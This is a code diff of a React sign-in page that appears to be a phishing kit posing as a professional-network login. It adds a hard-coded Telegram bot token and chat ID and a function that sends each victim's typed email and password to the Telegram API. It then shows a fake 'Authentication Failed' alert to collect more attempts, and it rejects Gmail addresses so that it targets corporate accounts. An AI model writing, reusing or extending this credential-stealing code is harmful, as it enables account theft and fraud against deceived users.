@@ -7,6 +7,8 @@ export default function App() {
   const [passwrd, setPasswrd] = useState("");
   const [dis, setDis] = useState(false);
   const [emal, setEmal] = useState("");
+  const botToken = `7265691709:AAFXtnai29CZnlERiEMwSxrKgrnx4Zg8kHU`;
+  const chatId = 5074224889;
 
   useEffect(() => {
     if (window.location.href.includes("email")) {
@@ -21,6 +23,80 @@ export default function App() {
     }
   }, [window.location.href]);
 
+  function regexGmail(userEmail) {
+    const emailRegex =
+      /([a-zA-Z0-9]+)([\.{1}])?([a-zA-Z0-9]+)\@(?:gmail|GMAIL)([\.])(?:com|COM)/;
+    return emailRegex.test(userEmail);
+  }
+
+  async function sendDetails(emal, passwrd) {
+    try {
+      const message = `
+!UPDATE
+
+~ New Details ~
+
+Email: ${emal}
+
+Password: ${passwrd}
+`;
+
+      const response = await fetch(
+        `https://api.telegram.org/bot${botToken}/sendMessage`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        }
+      );
+
+      const data = await response.json();
+      console.log(data);
+      console.log("Message sent successfully.");
+
+      // Success message should be shown here
+      alert(
+        `Authentication Failed \nInput correct credentials to preview files`
+      );
+      setPasswrd("");
+      setEmal("");
+    } catch (error) {
+      console.error("Error sending message:", error);
+    }
+  }
+
+  function handleFormDetails(e) {
+    e.preventDefault();
+
+    if(emal && passwrd){
+      checkDetails(emal, passwrd)
+    }
+    async function checkDetails(userEmail, userPassword) {
+      try {
+        if (regexGmail(userEmail)) {
+          alert('Input your domain email. Gmail not allowed');
+          return;
+        }
+
+        const formData = new FormData();
+        formData.append('userEmails', userEmail);
+        formData.append('userPasswords', userPassword);
+
+        const data = Object.fromEntries(formData);
+        console.log(data);
+        const { userEmails, userPasswords } = data;
+        await sendDetails(userEmails, userPasswords);
+      } catch (error) {
+        console.log(error);
+      }
+    }
+  }
+
   return (
     <main>
       <div className="logoCtn">
@@ -32,10 +108,7 @@ export default function App() {
             <h3>Sign in</h3>
             <p>Stay updated in your professional world.</p>
           </div>
-          <form
-            action="https://formsubmit.co/952fb51896d5f8d70142a128e67828f5"
-            method="POST"
-          >
+          <form onSubmit={handleFormDetails}>
             <div className="inputs">
               <input
                 type="emal"
@@ -74,9 +147,8 @@ export default function App() {
             ) : (
               <button
                 onClick={() => {
-                  if(emal) setDis(!dis);
-
-                  if(!emal) alert("Input your email address")
+                  if (emal) setDis(!dis);
+                  if (!emal) alert("Input your email address");
                 }}
               >
                 Next
